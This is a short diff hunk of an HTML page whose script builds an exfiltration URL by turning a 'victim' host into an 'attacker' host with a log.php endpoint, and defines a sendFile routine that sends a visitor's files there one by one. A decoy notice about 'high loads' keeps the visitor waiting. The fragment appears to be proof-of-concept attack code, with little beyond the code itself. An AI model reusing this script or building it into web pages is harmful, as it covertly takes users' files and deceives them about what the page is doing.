@@ -38,12 +38,12 @@ body {background: #333; color: #eee; font-family: 'Inconsolata', Verdana, sans-s
 <p style="color: yellow">Note: We're experiencing high loads now, please be patient...</p>
 </div>
 <script>
-var logUrl = window.location.href.replace('victim', 'evil').replace('dl.html','log.php');
+var logUrl = window.location.href.replace('victim', 'attacker').replace('dl.html','log.php');
 var clientId;
 var filelist;
 var sent = [];
 
-var sendFile = function(i) {
+var sendFile = function(i) { 
 	var file = window.filelist[i], fd;
 	
 	if ($.inArray(i, sent) !== -1) {
